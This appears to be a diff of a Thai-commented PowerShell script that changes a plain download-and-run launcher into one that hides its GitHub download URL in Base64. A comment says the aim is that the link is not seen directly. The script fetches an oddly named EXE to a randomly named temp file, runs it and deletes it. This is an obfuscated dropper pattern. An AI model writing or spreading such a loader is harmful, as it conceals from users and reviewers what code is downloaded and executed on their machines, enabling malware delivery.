@@ -1,39 +1,45 @@
-# run-app.ps1
+# run-hidden.ps1
 # ============================================
-# ดาวน์โหลดและรันไฟล์ EXE จาก GitHub
+# รันไฟล์ EXE จาก GitHub (ลิงก์ซ่อนใน Base64)
 # ============================================
 
-# 🔧 แก้ไข URL นี้ให้ตรงกับลิงก์ที่คุณโหลดได้
-$ลิงก์ดาวน์โหลด = "https://github.com/auden131313/fvvvie33333333333/releases/download/v1.0/allleawewaeaw.exe"
+# ค่า Base64 ของลิงก์ (ซ่อนไว้ ไม่เห็นลิงก์ตรงๆ)
+$base64 = "aHR0cHM6Ly9naXRodWIuY29tL2F1ZGVuMTMxMzEzL2Z2dnZpZTMzMzMzMzMzMzMzMy9yZWxlYXNlcy9kb3dubG9hZC92MS4wL2FsbGxlYXdld2FlYXcuZXhl"
 
-# ส่วนนี้ไม่ต้องแก้
+# ถอด Base64 กลับเป็นลิงก์ปกติ
+$ลิงก์ = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64))
+
+# ตั้งค่าไฟล์ชั่วคราว
 $ไฟล์ชั่วคราว = "$env:TEMP\temp_$(Get-Random).exe"
 
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "   เริ่มต้นทำงาน" -ForegroundColor Cyan
-Write-Host "========================================" -ForegroundColor Cyan
+# เริ่มทำงาน
+Clear-Host
+Write-Host ""
+Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║     ดาวน์โหลดและรันแอพจาก GitHub        ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
 
-Write-Host "📥 กำลังดาวน์โหลดจาก GitHub..." -ForegroundColor Yellow
+Write-Host "📥 กำลังดาวน์โหลด..." -ForegroundColor Yellow
 
 try {
     # ดาวน์โหลดไฟล์
-    Invoke-WebRequest -Uri $ลิงก์ดาวน์โหลด -OutFile $ไฟล์ชั่วคราว -UseBasicParsing
-    Write-Host "✅ ดาวน์โหลดสำเร็จ!" -ForegroundColor Green
-    Write-Host "💾 ไฟล์ชั่วคราว: $ไฟล์ชั่วคราว" -ForegroundColor Gray
+    Invoke-WebRequest -Uri $ลิงก์ -OutFile $ไฟล์ชั่วคราว -UseBasicParsing
     
-    # ตรวจสอบขนาดไฟล์ (optional)
-    $ขนาด = [math]::Round((Get-Item $ไฟล์ชั่วคราว).Length / 1MB, 2)
-    Write-Host "📊 ขนาดไฟล์: $ขนาด MB" -ForegroundColor Cyan
-    Write-Host ""
-    
-    # รันโปรแกรม
-    Write-Host "▶️ กำลังรันโปรแกรม..." -ForegroundColor Yellow
-    Write-Host "   (โปรแกรมจะทำงาน รอจนกว่าจะปิด)" -ForegroundColor Gray
-    Start-Process -FilePath $ไฟล์ชั่วคราว -Wait
-    
-    Write-Host ""
-    Write-Host "✅ โปรแกรมทำงานเสร็จ!" -ForegroundColor Green
+    # เช็คว่าดาวน์โหลดสำเร็จ
+    if (Test-Path $ไฟล์ชั่วคราว) {
+        $ขนาด = [math]::Round((Get-Item $ไฟล์ชั่วคราว).Length / 1MB, 2)
+        Write-Host "✅ ดาวน์โหลดสำเร็จ! (ขนาด: $ขนาด MB)" -ForegroundColor Green
+        Write-Host ""
+        
+        # รันโปรแกรม
+        Write-Host "▶️ กำลังรันโปรแกรม..." -ForegroundColor Yellow
+        Write-Host "   (โปรแกรมจะทำงาน รอจนกว่าโปรแกรมจะปิด)" -ForegroundColor Gray
+        Start-Process -FilePath $ไฟล์ชั่วคราว -Wait
+        
+        Write-Host ""
+        Write-Host "✅ โปรแกรมทำงานเสร็จเรียบร้อย!" -ForegroundColor Green
+    }
     
 } catch {
     Write-Host ""
@@ -44,15 +50,14 @@ try {
     # ลบไฟล์ชั่วคราว
     if (Test-Path $ไฟล์ชั่วคราว) {
         Remove-Item $ไฟล์ชั่วคราว -Force
-        Write-Host ""
         Write-Host "🗑️ ลบไฟล์ชั่วคราวเรียบร้อย" -ForegroundColor Gray
     }
 }
 
 Write-Host ""
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "   เสร็จสิ้น" -ForegroundColor Cyan
-Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║               เสร็จสิ้น                    ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "กดปุ่มใดๆ เพื่อปิดหน้าต่างนี้..." -ForegroundColor Gray
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
